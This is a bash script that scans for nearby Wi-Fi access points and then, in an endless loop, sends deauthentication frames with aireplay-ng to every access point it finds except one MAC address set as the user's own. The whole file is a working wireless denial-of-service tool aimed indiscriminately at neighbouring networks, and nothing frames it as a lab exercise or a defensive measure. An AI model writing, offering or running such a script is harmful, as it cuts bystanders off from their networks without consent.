#!/bin/bash

redoDelay=0
deauthTrys=2
YOUR_AP_MAC='7C:7D:3D:3F:15:4D'

function scan() {
    #setup for scan
    ifconfig wlan0 down
    iwconfig wlan0 mode managed
    ifconfig wlan0 up

    #scan
    AP_LIST=$(iwlist wlan0 scan | grep Address | awk '{ print $5 }')
    AP_CHANNEL_LIST=$(iwlist wlan0 scan | grep Frequency | awk '{ print $4 }')

    #ectract channels
    i=0
    for a in $AP_CHANNEL_LIST
    do
	    array[i]=$( echo $a | cut -f1 -d')' )
	    i=$i+1
    done
}

function attack() {
    #setup for attack
    ifconfig wlan0 down
    iwconfig wlan0 mode monitor
    ifconfig wlan0 up

    i=0
    for a in $AP_LIST
    do
        #set channel
        airmon-ng stop wlan0
        airmon-ng start wlan0 ${array[i]}
        i=$i+1

        #attack
        echo '[*]Attacking' $a
        if [ $a != $YOUR_AP_MAC ]; then
            aireplay-ng -0 $deauthTrys -a $a wlan0
        fi
    done

    #wait befor repeat
    sleep $redoDelay
    scan
    attack
}

AP_LIST=''
AP_CHANNEL_LIST=''

scan
echo $AP_LIST

attack
